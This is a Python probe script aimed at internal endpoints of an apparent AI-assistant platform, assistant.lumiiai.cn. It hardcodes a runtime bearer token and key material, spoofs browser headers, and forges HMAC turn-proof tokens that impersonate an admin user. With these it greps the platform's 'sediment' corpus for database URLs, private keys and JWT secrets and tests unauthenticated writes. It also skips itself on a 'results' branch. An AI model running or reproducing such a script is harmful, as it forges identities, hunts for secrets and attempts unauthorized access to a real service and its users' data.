#!/usr/bin/env python3
# intent 28664 follow-up: clean up self-created probe files in sediment tree + confirm sediment corpus holds no prod secrets.
import os, sys, json, time, base64, hmac, hashlib, subprocess
_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)
HOST="assistant.lumiiai.cn"; ORG="org_bTLzxtBLmugV8uxx4QTyw"
RID="rt_KTWyBZUur4cjUsRGP3zRk"; RTOKEN="jy3151agR2zGGHQ08X_m52K04nsfiVsYi7LEJNDRE4Q"
PK_FB="CntmKUfWiId2whBB7yGfPu5nKcKzmwUeKGGcWFGUVr8"; ADMIN="usr_ZxLewKrgbRYSm7rWDtQX8"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
START=time.time()
def log(*a): print(" ".join(str(x) for x in a),flush=True)
def el(): return int(time.time()-START)
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def raw(args,timeout=40):
    try:
        r=subprocess.run(["curl","-s","-k","-m",str(timeout)]+args,capture_output=True,timeout=timeout+20); return r.stdout,r.stderr[:300]
    except Exception as e: return b"",repr(e)[:200]
def call(path,method="GET",body=None,hdrs=None,timeout=40,maxlen=1500):
    args=["--http2","-A",UA,"-H","Accept: application/json","-H","Origin: https://"+HOST,"-H","Referer: https://"+HOST+"/","-w","\n__CODE__%{http_code}"]
    for k,v in (hdrs or {}).items(): args+=["-H","%s: %s"%(k,v)]
    if body is not None: args+=["-X",method,"-H","Content-Type: application/json","--data-binary",json.dumps(body)]
    elif method!="GET": args+=["-X",method]
    args+=["https://"+HOST+path]
    out,err=raw(args,timeout); t=out.decode("utf-8","replace"); code=""
    i=t.rfind("__CODE__")
    if i>=0: code=t[i+8:].strip()[:3]; t=t[:i]
    return {"code":code,"body":t[:maxlen],"len":len(t)}
def R(k,v): log("R:%s:%s"%(k,json.dumps(v,ensure_ascii=False)[:1200]))
MH={"Authorization":"Bearer "+RTOKEN,"x-agent-id":RID}
log("### B0 identity t=%ds"%el())
PK=PK_FB
k=call("/api/runtimes/keys/current",hdrs={"x-agent-id":RID,"x-agent-token":RTOKEN})
try:
    pk=json.loads(k["body"]).get("proof_key");
    if pk: PK=pk
except Exception: pass
log("[keys] code=%s pk=%s"%(k["code"],PK))
now=int(time.time())
def proof(actor=ADMIN):
    sk="conv_"+actor[-8:]
    pl={"platform":"dashboard","session_key":sk,"actor_id":actor,"chat_id":sk,"iss":RID,"aud":RID,"iat":now,"exp":now+3600}
    pb=b64u(json.dumps(pl,separators=(',',':')))
    return "v2."+pb+"."+b64u(hmac.new(PK.encode(),pb.encode(),hashlib.sha256).digest())
def HP(actor=ADMIN):
    h=dict(MH); h["x-lumii-turn-proof"]=proof(actor); return h

log("### Cleanup: prune only our own litter folder probe28664nofolder/raw t=%ds"%el())
r=call("/internal/sediment/prune","POST",{"org_id":ORG,"folder_node_id":"probe28664nofolder","sub":"raw","keep":[]},MH)
R("cleanup_prune",r)

log("### Secret-grep over sediment corpus t=%ds"%el())
for q in ["DATABASE_URL","PRIVATE KEY","BEGIN OPENSSH","JWT_SECRET","postgres://","LUMII_TURN_TICKET","0x"]:
    r=call("/internal/sediment/grep","POST",{"org_id":ORG,"q":q,"limit":5},HP())
    n=None
    try: n=len(json.loads(r["body"]).get("hits",[]))
    except Exception: pass
    R("grep_"+q.replace(" ","_").replace("/","_"),{"code":r["code"],"nhits":n,"body":r["body"][:200]})

log("### No-cred auth t=%ds"%el())
r=call("/internal/sediment/where","GET",hdrs={})
R("where_nocred",{"code":r["code"],"body":r["body"][:200]})
r=call("/internal/sediment/write","POST",{"org_id":ORG,"folder_node_id":"x","sub":"raw","rel_path":"a.md","content":"y"},hdrs={})
R("write_nocred",{"code":r["code"],"body":r["body"][:200]})
log("### DONE t=%ds"%el())
